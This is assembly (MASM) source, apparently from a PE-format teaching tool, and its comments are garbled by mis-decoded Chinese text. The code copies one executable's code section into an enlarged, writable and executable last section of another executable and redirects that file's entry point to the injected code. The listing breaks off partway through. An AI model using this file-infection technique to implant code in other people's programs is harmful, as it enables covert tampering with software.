;	_dwSubItem = Ҫ�޸ĵ��ֶεı�ţ�-1��ʾ�����µ��У�>=1��ʾ�ֶεı��
;-----------------------------------------------------------------------
_ListViewSetItem	proc uses ebx ecx _hWinView,_dwItem,_dwSubItem,_lpszText
              invoke  RtlZeroMemory,addr stLVI,sizeof LV_ITEM

              invoke lstrlen,_lpszText
              mov stLVI.cchTextMax,eax
              mov stLVI.imask,LVIF_TEXT
              push _lpszText
              pop stLVI.pszText
              push _dwItem
              pop stLVI.iItem
              push _dwSubItem
              pop stLVI.iSubItem

              .if _dwSubItem == -1
                 mov stLVI.iSubItem,0
                 invoke SendMessage,_hWinView,LVM_INSERTITEM,NULL,addr stLVI
              .else
                 invoke SendMessage,_hWinView,LVM_SETITEM,NULL,addr stLVI
              .endif
              
              ret

_ListViewSetItem	endp
;----------------------
; ���ListView�е�����
; ɾ�����е��к����е���
;----------------------
_ListViewClear	proc uses ebx ecx _hWinView

		invoke	SendMessage,_hWinView,LVM_DELETEALLITEMS,0,0
		.while	TRUE
			invoke	SendMessage,_hWinView,LVM_DELETECOLUMN,0,0
			.break	.if ! eax
		.endw
		ret

_ListViewClear	endp

;---------------------
; ����ָ�����е�ֵ
; �����szBuffer��
;---------------------
_GetListViewItem   proc  _hWinView:DWORD,_dwLine:DWORD,_dwCol:DWORD,_lpszText
              local @stLVI:LV_ITEM
              pushad
              
              invoke	RtlZeroMemory,addr @stLVI,sizeof LV_ITEM
              invoke RtlZeroMemory,_lpszText,512

              mov  @stLVI.cchTextMax,512
              mov  @stLVI.imask,LVIF_TEXT
              push   _lpszText
              pop  @stLVI.pszText
              push _dwCol
              pop  @stLVI.iSubItem

              invoke SendMessage,_hWinView,LVM_GETITEMTEXT,_dwLine,addr @stLVI
              popad
              ret
_GetListViewItem   endp
;---------------------
; ��ʼ��������
;---------------------
_clearResultView  proc uses ebx ecx
             invoke _ListViewClear,hProcessModuleTable

             ;��ӱ�ͷ
             mov ebx,1
             mov eax,200
             lea ecx,szResultColName1
             invoke _ListViewAddColumn,hProcessModuleTable,ebx,eax,ecx

             mov ebx,2
             mov eax,340
             lea ecx,szResultColName2
             invoke _ListViewAddColumn,hProcessModuleTable,ebx,eax,ecx

             mov ebx,3
             mov eax,340
             lea ecx,szResultColName3
             invoke _ListViewAddColumn,hProcessModuleTable,ebx,eax,ecx

             mov dwCount,0
             ret
_clearResultView  endp
;---------------------
; ���ı�����׷���ı�
;---------------------
_appendInfo proc _lpsz
  local @stCR:CHARRANGE

  pushad
  invoke GetWindowTextLength,hWinEdit
  mov @stCR.cpMin,eax  ;��������ƶ������
  mov @stCR.cpMax,eax
  invoke SendMessage,hWinEdit,EM_EXSETSEL,0,addr @stCR
  invoke SendMessage,hWinEdit,EM_REPLACESEL,FALSE,_lpsz
  popad
  ret
_appendInfo endp
;---------------------
; ���ļ�ƫ��ת��Ϊ�ڴ�ƫ����RVA
; lp_FileHeadΪ�ļ�ͷ����ʼ��ַ
; _dwOffΪ�������ļ�ƫ�Ƶ�ַ
;---------------------
_OffsetToRVA proc _lpFileHead,_dwOffset
  local @dwReturn
  
  pushad

  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwOffset
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].PointerToRawData
    add eax,[edx].SizeOfRawData    ;����ýڽ���RVA
    .if (edi>=[edx].PointerToRawData)&&(edi<eax)
      mov eax,[edx].PointerToRawData
      sub edi,eax                ;����RVA�ڽ��е�ƫ��
      mov eax,[edx].VirtualAddress
      add eax,edi                ;���Ͻ����ڴ��е���ʼλ��
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,-1
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_OffsetToRVA endp
;---------------------
; ���ڴ�ƫ����RVAת��Ϊ�ļ�ƫ��
;---------------------
_RVAToOffset proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].VirtualAddress
      sub edi,eax                ;����RVA�ڽ��е�ƫ��
      mov eax,[edx].PointerToRawData
      add eax,edi                ;���Ͻ����ļ��еĵ���ʼλ��
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,-1
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_RVAToOffset endp

;----------------------------------------
; ��ȡ�½ڵ�RVA��ַ
;----------------------------------------
_getNewSectionRVA  proc _lpFileHead
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,esi
  add edi,sizeof IMAGE_NT_HEADERS
  assume edi:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections

  
  xor edx,edx
  mov eax,ecx
  dec eax
  mov bx,sizeof IMAGE_SECTION_HEADER
  mul bx
  add edi,eax       ;��λ�����һ���ڶ��崦
  assume edi:ptr IMAGE_SECTION_HEADER
  mov eax,[edi].SizeOfRawData
  xor edx,edx
  mov bx,1000h
  div bx
  .if edx!=0
    inc eax
  .endif
  xor edx,edx
  mul bx
  mov ebx,eax

  mov eax,[edi].VirtualAddress
  add eax,ebx

  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getNewSectionRVA endp

;-----------------------------
; ����
; ��ڣ�eax----�����ֵ
;       ecx----��������
; ���ڣ�eax----�����Ժ��ֵ
;-----------------------------
_align       proc
    push edx

    xor edx,edx
    div ecx
    .if edx>0
      inc eax
    .endif
    xor edx,edx
    mul ecx
    pop edx
    ret
_align       endp

;----------------------------------------
; ��ȡ�ڵĸ���
;----------------------------------------
_getSectionCount  proc _lpFileHead
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  movzx ecx,[esi].FileHeader.NumberOfSections
  mov @dwReturn,ecx
  popad
  mov eax,@dwReturn
  ret
_getSectionCount endp

;----------------------------------------
; ��ȡ�ļ��Ķ�������
;----------------------------------------
getSectionAlign  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  mov ecx,[esi].OptionalHeader.SectionAlignment  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
getSectionAlign  endp


;--------------------------------------
; ��ȡĿ��PEͷ�����ݵ���Ч����
;--------------------------------------
getValidHeadSize proc _lpFileHead
  local @dwReturn
  local @dwTemp
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  mov eax,[edx].PointerToRawData     ;ָ���һ���ڵ���ʼ
  mov @dwTemp,eax

  dec eax
  mov esi,eax
  add esi,_lpFileHead
  mov @dwReturn,0
  .repeat
    mov bl,byte ptr [esi]
    .if bl!=0
      .break
    .endif
    dec esi
    inc @dwReturn
  .until FALSE
  mov eax,@dwTemp
  sub eax,@dwReturn
  add eax,2          ;Ϊ��Ч������������0�ַ�������������Ч����Ϊ�ַ�����������0����
  mov @dwReturn,eax

  popad
  mov eax,@dwReturn

  ret
getValidHeadSize endp

;------------------------
; ��ȡRVA���ڽڵ�����
;------------------------
_getRVASectionName  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,edx
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,offset szNotFound
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionName  endp

;------------------------
; ��ȡRVA���ڽڵ��ļ���ʼ��ַ
;------------------------
_getRVASectionStart  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].PointerToRawData
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,offset szNotFound
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionStart  endp


;------------------------
; ��ȡRVA���ڽڵ�ԭʼ��С
;------------------------
_getRVASectionSize  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      ;invoke _appendInfo,edx
      mov eax,[edx].Misc
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,offset szNotFound
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionSize  endp

;------------------------
; ��ȡRVA���ڽ����ļ��ж����Ժ�Ĵ�С
;------------------------
_getRVASectionRawSize  proc _lpFileHead,_dwRVA
  local @dwReturn
  
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edi,_dwRVA
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  movzx ecx,[esi].FileHeader.NumberOfSections
  ;�����ڱ�
  .repeat
    mov eax,[edx].VirtualAddress
    add eax,[edx].SizeOfRawData  ;����ýڽ���RVA
    .if (edi>=[edx].VirtualAddress)&&(edi<eax)
      mov eax,[edx].SizeOfRawData
      jmp @F
    .endif
    add edx,sizeof IMAGE_SECTION_HEADER
  .untilcxz
  assume edx:nothing
  assume esi:nothing
  mov eax,offset szNotFound
@@:
  mov @dwReturn,eax
  popad
  mov eax,@dwReturn
  ret
_getRVASectionRawSize  endp

_getRVACount  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  movzx ecx,[esi].FileHeader.NumberOfSections  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
_getRVACount endp

;------------------------------------
; ��ȡ���һ�ڵ����ļ���ƫ��
;-------------------------------------
getLastSectionStart proc _lpFileHead
  local @ret
  pushad
  invoke _getRVACount,_lpFileHead
  xor edx,edx
  dec eax
  mov ecx,28h
  mul ecx

  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  add esi,sizeof IMAGE_NT_HEADERS  
  add esi,eax
  assume esi:ptr IMAGE_SECTION_HEADER
  mov eax,[esi].PointerToRawData
  mov @ret,eax
  popad
  mov eax,@ret
  ret
getLastSectionStart endp

getFileAlign  proc _lpFileHead
  local @ret
  pushad
  mov esi,_lpFileHead
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew
  assume esi:ptr IMAGE_NT_HEADERS
  mov edx,esi
  add edx,sizeof IMAGE_NT_HEADERS
  assume edx:ptr IMAGE_SECTION_HEADER
  mov ecx,[esi].OptionalHeader.FileAlignment  
  mov @ret,ecx
  popad
  mov eax,@ret
  ret
getFileAlign  endp
;-------------------
; ȡ�������ڽڵĴ�С
; ����ڶ�λ������
; ��ڵ�ַָ���RVA���ڵĽ�
; _lpHeaderָ���ڴ���PE�ļ�����ʼ
; ����ֵ��eax��
;-------------------
getCodeSegSize proc _lpHeader
   local @dwSize
   pushad
   
   mov esi,_lpHeader
   assume esi:ptr IMAGE_DOS_HEADER
   add esi,[esi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
   assume esi:ptr IMAGE_NT_HEADERS
   mov eax,[esi].OptionalHeader.AddressOfEntryPoint

   invoke _getRVASectionSize,_lpHeader,eax
   mov @dwSize,eax   
   popad
   mov eax,@dwSize
   ret
getCodeSegSize endp

;-------------------
; ȡ�����������ڽڵĴ�С
; _lpHeaderָ���ڴ���PE�ļ�����ʼ
; ����ֵ��eax��
;-------------------
getCodeSegStart proc _lpHeader
   local @dwStart
   pushad
   
   mov esi,_lpHeader
   assume esi:ptr IMAGE_DOS_HEADER
   add esi,[esi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
   assume esi:ptr IMAGE_NT_HEADERS
   mov eax,[esi].OptionalHeader.AddressOfEntryPoint
   invoke _getRVASectionStart,_lpHeader,eax
   mov @dwStart,eax   
   popad
   mov eax,@dwStart
   ret
getCodeSegStart endp

;-------------------------
; ��ȡ�������
;-------------------------
getEntryPoint  proc  _lpFile
   local @ret
   pushad
   mov edi,_lpFile
   assume edi:ptr IMAGE_DOS_HEADER

   add edi,[edi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
   assume edi:ptr IMAGE_NT_HEADERS
   ;ȡԴ����װ�ص�ַ
   add edi,4
   add edi,sizeof IMAGE_FILE_HEADER
   assume edi:ptr IMAGE_OPTIONAL_HEADER32
   mov eax,[edi].AddressOfEntryPoint
   mov @ret,eax
   popad
   mov eax,@ret
   ret
getEntryPoint endp
;--------------
;
;--------------------
writeToFile proc _lpFile,_dwSize
  local @dwWritten
  pushad
  invoke CreateFile,addr szDstFile,GENERIC_WRITE,\
            FILE_SHARE_READ,\
                0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
  mov hFile,eax
  invoke WriteFile,hFile,_lpFile,_dwSize,addr @dwWritten,NULL
  invoke CloseHandle,hFile      
  popad
  ret
writeToFile endp

;-------------------------------------
; �ı�Ŀ��PE�ڵ��ļ�ƫ������
;-------------------------------------
changeRawOffset proc _lpHeader0,_lpHeader
  local @dwSize,@dwSectionSize
  local @ret
  local @dwTemp,@dwTemp1
  pushad

  mov esi,_lpHeader
  assume esi:ptr IMAGE_DOS_HEADER
  add esi,[esi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
  assume esi:ptr IMAGE_NT_HEADERS
  ;ȡ�ڵ�����
  add esi,4
  assume esi:ptr IMAGE_FILE_HEADER
  movzx ecx,[esi].NumberOfSections
  mov @dwSectionSize,ecx

  

  mov edi,lpDstMemory
  assume edi:ptr IMAGE_DOS_HEADER
  add edi,[edi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
  assume edi:ptr IMAGE_NT_HEADERS
   
  pushad
  invoke _appendInfo,addr szCrLf
  invoke _appendInfo,addr szOut107
  popad

  add edi,sizeof IMAGE_NT_HEADERS   ;ediָ��ڱ�λ��
  .repeat
     assume edi:ptr IMAGE_SECTION_HEADER
     mov ebx,[edi].PointerToRawData  ;ȡ�����ļ��е�ƫ��
     mov @dwTemp,ebx
     add ebx,dwOff      ;������ֵ
     mov @dwTemp1,ebx
     mov dword ptr [edi].PointerToRawData,ebx

     ; ��ʾ
     pushad
     mov eax,[edi].VirtualAddress
     inc eax
     invoke _getRVASectionName,_lpHeader,eax
     invoke wsprintf,addr szBuffer,addr szOut108,eax,@dwTemp,@dwTemp1
     invoke _appendInfo,addr szBuffer 
     popad  

     dec @dwSectionSize
     add edi,sizeof IMAGE_SECTION_HEADER
     .break .if @dwSectionSize==0
  .until FALSE
   

  popad 
  ret
changeRawOffset  endp


;------------------------------------------
; �������ļ�
;------------------------------------------
_createMessage1	proc
		local	@stOF:OPENFILENAME
		local	@stES:EDITSTREAM

                ;�����֮ǰ�����ļ�������ڣ����ȹر��ٸ�ֵ                
                .if hFile
                   invoke CloseHandle,hFile
                   mov hFile,0
                .endif
                ; ��ʾ�����ļ����Ի���
		invoke	RtlZeroMemory,addr @stOF,sizeof @stOF
		mov	@stOF.lStructSize,sizeof @stOF
		push	hWinMain
		pop	@stOF.hwndOwner
                push    hInstance
                pop     @stOF.hInstance
		mov	@stOF.lpstrFilter,offset szFilter1
		mov	@stOF.lpstrFile,offset szFileNameOpen1
		mov	@stOF.nMaxFile,MAX_PATH
		mov	@stOF.Flags,OFN_FILEMUSTEXIST or\
                                    OFN_HIDEREADONLY or OFN_PATHMUSTEXIST
		invoke	GetOpenFileName,addr @stOF
		.if	eax
                        invoke SetWindowText,hText1,addr szFileNameOpen1
		.endif
		ret

_createMessage1	endp
;------------------------------------------
; �������ļ�
;------------------------------------------
_createMessage2	proc
		local	@stOF:OPENFILENAME
		local	@stES:EDITSTREAM

                ;�����֮ǰ�����ļ�������ڣ����ȹر��ٸ�ֵ                
                .if hFile
                   invoke CloseHandle,hFile
                   mov hFile,0
                .endif
                ; ��ʾ�����ļ����Ի���
		invoke	RtlZeroMemory,addr @stOF,sizeof @stOF
		mov	@stOF.lStructSize,sizeof @stOF
		push	hWinMain
		pop	@stOF.hwndOwner
                push    hInstance
                pop     @stOF.hInstance
		mov	@stOF.lpstrFilter,offset szFilter1
		mov	@stOF.lpstrFile,offset szFileNameOpen2
		mov	@stOF.nMaxFile,MAX_PATH
		mov	@stOF.Flags,OFN_FILEMUSTEXIST or\
                                    OFN_HIDEREADONLY or OFN_PATHMUSTEXIST
		invoke	GetOpenFileName,addr @stOF
		.if	eax
                        invoke SetWindowText,hText2,addr szFileNameOpen2
		.endif
		ret

_createMessage2	endp

;--------------------------
; ��_lpPointλ�ô�_dwSize���ֽ�ת��Ϊ16���Ƶ��ַ���
; bufTemp1��Ϊת������ַ���
;--------------------------
_Byte2Hex     proc _dwSize
  local @dwSize:dword

  pushad
  mov esi,offset bufTemp2
  mov edi,offset bufTemp1
  mov @dwSize,0
  .repeat
    mov al,byte ptr [esi]

    mov bl,al
    xor edx,edx
    xor eax,eax
    mov al,bl
    mov cx,16
    div cx   ;�����λ��al�У�������dl��


    xor bx,bx
    mov bl,al
    movzx edi,bx
    mov bl,byte ptr lpszHexArr[edi]
    mov eax,@dwSize
    mov byte ptr bufTemp1[eax],bl


    inc @dwSize

    xor bx,bx
    mov bl,dl
    movzx edi,bx

    ;invoke wsprintf,addr szBuffer,addr szOut2,edx
    ;invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK

    mov bl,byte ptr lpszHexArr[edi]
    mov eax,@dwSize
    mov byte ptr bufTemp1[eax],bl

    inc @dwSize
    mov bl,20h
    mov eax,@dwSize
    mov byte ptr bufTemp1[eax],bl
    inc @dwSize
    inc esi
    dec _dwSize
    .break .if _dwSize==0
   .until FALSE

   mov bl,0
   mov eax,@dwSize
   mov byte ptr bufTemp1[eax],bl

   popad
   ret
_Byte2Hex    endp

_MemCmp  proc _lp1,_lp2,_size
   local @dwResult:dword

   pushad
   mov esi,_lp1
   mov edi,_lp2
   mov ecx,_size
   .repeat
     mov al,byte ptr [esi]
     mov bl,byte ptr [edi]
     .break .if al!=bl
     inc esi
     inc edi
     dec ecx
     .break .if ecx==0
   .until FALSE
   .if ecx!=0
     mov @dwResult,1
   .else 
     mov @dwResult,0
   .endif
   popad
   mov eax,@dwResult
   ret
_MemCmp  endp

;--------------------------------------------
; �ڱ��������һ��
; _lpSZΪ��һ��Ҫ��ʾ���ֶ���
; _lpSP1Ϊ��һ���ļ����ֶε�λ��
; _lpSP2Ϊ�ڶ����ļ����ֶε�λ��
; _SizeΪ���ֶε��ֽڳ���
;--------------------------------------------
_addLine proc
  pushad

  inc dwNumber
  invoke _ListViewSetItem,hProcessModuleTable,dwNumber,-1,\
               addr bufTemp1             ;�ڱ����������һ��
  mov dwCount,eax
  invoke RtlZeroMemory,addr bufTemp3,200
  invoke wsprintf,addr bufTemp3,addr sz1,dwNumber

  xor ebx,ebx
  invoke _ListViewSetItem,hProcessModuleTable,dwCount,ebx,\
         addr bufTemp3                   ; ���
  
  inc ebx
  invoke _ListViewSetItem,hProcessModuleTable,dwCount,ebx,\
                   addr bufTemp1 ;��ֵ

  inc ebx
  invoke _ListViewSetItem,hProcessModuleTable,dwCount,ebx,\
                   addr bufTemp2 ;��ʱ

  popad
  ret
_addLine  endp


;--------------
;  д���ļ�
;--------------------
writeToExeFile proc _lpFile,_dwSize
  local @dwWritten
  pushad
  invoke CreateFile,addr szDstFile1,GENERIC_WRITE,\
            FILE_SHARE_READ,\
                0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
  mov hFile,eax
  invoke WriteFile,hFile,_lpFile,_dwSize,addr @dwWritten,NULL
  invoke CloseHandle,hFile      
  popad
  ret
writeToExeFile endp
;--------------------
; ��PE�ļ�������
;--------------------
_createMessage proc
  local @stOF:OPENFILENAME
  local @hFile,@dwFileSize,@hMapFile,@lpMemory
  local @hFile1,@dwFileSize1,@hMapFile1,@lpMemory1
  local @bufTemp1[10]:byte
  local @dwTemp:dword,@dwTemp1:dword
  local @dwBuffer,@lpDst,@hDstFile


  invoke CreateFile,addr szFileNameOpen1,GENERIC_READ,\
         FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,\
         OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL

  .if eax!=INVALID_HANDLE_VALUE
    mov @hFile,eax
    invoke GetFileSize,eax,NULL
    mov @dwFileSize,eax
    .if eax
      invoke CreateFileMapping,@hFile,\  ;�ڴ�ӳ���ļ�
             NULL,PAGE_READONLY,0,0,NULL
      .if eax
        mov @hMapFile,eax
        invoke MapViewOfFile,eax,\
               FILE_MAP_READ,0,0,0
        .if eax
          mov @lpMemory,eax              ;����ļ����ڴ��ӳ����ʼλ��
          assume fs:nothing
          push ebp
          push offset _ErrFormat
          push offset _Handler
          push fs:[0]
          mov fs:[0],esp

          ;���PE�ļ��Ƿ���Ч
          mov esi,@lpMemory
          assume esi:ptr IMAGE_DOS_HEADER
          .if [esi].e_magic!=IMAGE_DOS_SIGNATURE  ;�ж��Ƿ���MZ����
            jmp _ErrFormat
          .endif
          add esi,[esi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
          assume esi:ptr IMAGE_NT_HEADERS
          .if [esi].Signature!=IMAGE_NT_SIGNATURE ;�ж��Ƿ���PE����
            jmp _ErrFormat
          .endif
        .endif
      .endif
    .endif
  .endif

  invoke CreateFile,addr szFileNameOpen2,GENERIC_READ,\
         FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,\
         OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL

  .if eax!=INVALID_HANDLE_VALUE
    mov @hFile1,eax
    invoke GetFileSize,eax,NULL
    mov @dwFileSize1,eax
    .if eax
      invoke CreateFileMapping,@hFile1,\  ;�ڴ�ӳ���ļ�
             NULL,PAGE_READONLY,0,0,NULL
      .if eax
        mov @hMapFile1,eax
        invoke MapViewOfFile,eax,\
               FILE_MAP_READ,0,0,0
        .if eax
          mov @lpMemory1,eax              ;����ļ����ڴ��ӳ����ʼλ��
          assume fs:nothing
          push ebp
          push offset _ErrFormat1
          push offset _Handler
          push fs:[0]
          mov fs:[0],esp

          ;���PE�ļ��Ƿ���Ч
          mov esi,@lpMemory1
          assume esi:ptr IMAGE_DOS_HEADER
          .if [esi].e_magic!=IMAGE_DOS_SIGNATURE  ;�ж��Ƿ���MZ����
            jmp _ErrFormat1
          .endif
          add esi,[esi].e_lfanew    ;����ESIָ��ָ��PE�ļ�ͷ
          assume esi:ptr IMAGE_NT_HEADERS
          .if [esi].Signature!=IMAGE_NT_SIGNATURE ;�ж��Ƿ���PE����
            jmp _ErrFormat1
          .endif
        .endif
      .endif
    .endif
  .endif

  ;����Ϊֹ�������ڴ��ļ���ָ���Ѿ���ȡ���ˡ�@lpMemory��@lpMemory1�ֱ�ָ�������ļ�ͷ
  ;�����Ǵ�����ļ�ͷ��ʼ���ҳ������ݽṹ���ֶ�ֵ�����бȽϡ�



  ;��������δ�С        
  invoke getCodeSegSize,@lpMemory
  mov dwPatchCodeSize,eax 

  invoke wsprintf,addr szBuffer,addr szOut100,eax
  invoke _appendInfo,addr szBuffer 
 

  ;���ļ���С�����ļ��������ȶ���
  
  invoke getFileAlign,@lpMemory1
  mov dwFileAlign,eax
  xchg eax,ecx
  mov eax,@dwFileSize1
  invoke _align
  mov dwNewFileAlignSize,eax

  invoke wsprintf,addr szBuffer,addr szOut121,@dwFileSize1,dwNewFileAlignSize
  invoke _appendInfo,addr szBuffer 

  ;�����һ�����ļ��е�ƫ��
  invoke getLastSectionStart,@lpMemory1
  mov dwLastSectionStart,eax

  invoke wsprintf,addr szBuffer,addr szOut122,eax
  invoke _appendInfo,addr szBuffer 

  ;�����һ�ڴ�С
  mov eax,dwNewFileAlignSize
  sub eax,dwLastSectionStart
  add eax,dwPatchCodeSize
  ;����ֵ�����ļ��������ȶ���
  mov ecx,dwFileAlign
  invoke _align
  mov dwLastSectionAlignSize,eax

  invoke wsprintf,addr szBuffer,addr szOut123,eax
  invoke _appendInfo,addr szBuffer 


  ;�����ļ���С
  mov eax,dwLastSectionStart
  add eax,dwLastSectionAlignSize
  mov dwNewFileSize,eax

  invoke wsprintf,addr szBuffer,addr szOut124,eax
  invoke _appendInfo,addr szBuffer 
 

  ;�����ڴ�ռ�
  invoke GlobalAlloc,GHND,dwNewFileSize
  mov @hDstFile,eax
  invoke GlobalLock,@hDstFile
  mov lpDstMemory,eax   ;��ָ���@lpDst

  
  ;��Ŀ���ļ��������ڴ�����
  mov ecx,@dwFileSize1   
  invoke MemCopy,@lpMemory1,lpDstMemory,ecx

  ;���������븽�ӵ��µĽ���
  invoke getCodeSegStart,@lpMemory
  mov dwPatchCodeSegStart,eax

  ;������������
  mov esi,dwPatchCodeSegStart  
  add esi,@lpMemory

  mov edi,lpDstMemory
  add edi,dwNewFileAlignSize

  mov ecx,dwPatchCodeSize
  invoke MemCopy,esi,edi,ecx

  ;---------------------------����Ϊֹ�����ݿ������  

  ;����

  ;����SizeOfRawData
  invoke _getRVACount,lpDstMemory
  xor edx,edx
  dec eax
  mov ecx,sizeof IMAGE_SECTION_HEADER
  mul ecx

  mov edi,lpDstMemory
  assume edi:ptr IMAGE_DOS_HEADER
  add edi,[edi].e_lfanew
  add edi,sizeof IMAGE_NT_HEADERS  
  add edi,eax
  assume edi:ptr IMAGE_SECTION_HEADER
  mov eax,dwLastSectionAlignSize
  mov [edi].SizeOfRawData,eax

  ;����Miscֵ
  invoke getSectionAlign,@lpMemory1
  mov dwSectionAlign,eax
  xchg eax,ecx
  mov eax,dwLastSectionAlignSize
  invoke _align
  mov [edi].Misc,eax

  ;�޸ı�־
  mov eax,0c0000060h
  mov [edi].Characteristics,eax
  ;����VirtualAddress

  mov eax,[edi].VirtualAddress  ;ȡԭʼRVAֵ
  mov dwVirtualAddress,eax

  ;����������ڵ�ַ  
  mov eax,dwNewFileAlignSize
  invoke _OffsetToRVA,lpDstMemory,eax
  mov dwNewEntryPoint,eax
  mov edi,lpDstMemory
  assume edi:ptr IMAGE_DOS_HEADER
  add edi,[edi].e_lfanew    
  assume edi:ptr IMAGE_NT_HEADERS
  mov eax,[edi].OptionalHeader.AddressOfEntryPoint
  mov dwDstEntryPoint,eax
  mov eax,dwNewEntryPoint
  mov [edi].OptionalHeader.AddressOfEntryPoint,eax
  
  mov eax,dwDstEntryPoint
  sub eax,dwNewEntryPoint
  mov dwEIPOff,eax

  ;����SizeOfImage
  mov eax,dwLastSectionAlignSize
  mov ecx,dwSectionAlign
  invoke _align
